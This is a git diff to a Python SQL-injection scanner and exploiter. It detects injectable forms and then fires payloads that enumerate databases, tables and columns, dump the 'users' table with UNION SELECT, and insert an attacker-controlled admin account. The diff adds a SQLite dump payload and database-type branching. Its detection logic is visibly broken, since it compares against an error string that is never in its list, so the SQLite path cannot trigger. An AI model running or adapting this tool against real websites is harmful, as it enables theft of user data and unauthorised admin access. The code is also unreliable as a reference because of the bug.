@@ -18,6 +18,8 @@ show_columns = "'); SHOW COLUMNS FROM users; -- "
 dump_all = "') UNION SELECT * FROM users -- "
 post_admin = "admin', 'whatever', 'hackmail') -- "
 
+sqlite_dump = "' UNION SELECT * FROM users -- "
+
 
 if len(sys.argv) < 2:
     print("You need to provide at least 1 param")
@@ -29,6 +31,7 @@ s = requests.Session()
 
 type_action = "get"
 storage_file = "default_storage.txt"
+base_type = "mysql"
 
 for index, arg in enumerate(sys.argv[1:]):
     if len(sys.argv) == index+2:
@@ -71,13 +74,16 @@ def get_form_details(form):
 
 
 def is_vulnerable(response):
+    global base_type
     errors = {
         "you have an error in your sql syntax;",
         "warning: mysql",
-        "SQLite3"
+        "sqlite3"
     }
     for error in errors:
         if error in response.content.decode().lower():
+            if error == "sqlite3::query():":
+                base_type = "sqlite3"
             return True
     return False
 
@@ -106,13 +112,20 @@ def scan_sql_injection(url):
                 print(f"Injection vulnerability detected for: {url}. Form: \n{form_details}")
                 try:
                     with open(storage_file, "w") as f:
-                        if type_action == "get":
-                            get_injector(url, form_details, show_databases, f)
-                            get_injector(url, form_details, show_table, f)
-                            get_injector(url, form_details, show_columns, f)
-                            get_injector(url, form_details, dump_all, f)
+                        if base_type == "mysql":
+                            if type_action == "get":
+                                get_injector(url, form_details, show_databases, f)
+                                get_injector(url, form_details, show_table, f)
+                                get_injector(url, form_details, show_columns, f)
+                                get_injector(url, form_details, dump_all, f)
+                            else:
+                                post_injector(url, form_details, post_admin)
                         else:
-                            post_injector(url, form_details, post_admin)
+                            if type_action == "get":
+                                get_injector(url, form_details, sqlite_dump, f)
+                            else:
+                                post_injector(url, form_details, post_admin)
+
                 except:
                     print("File exception")
                 break
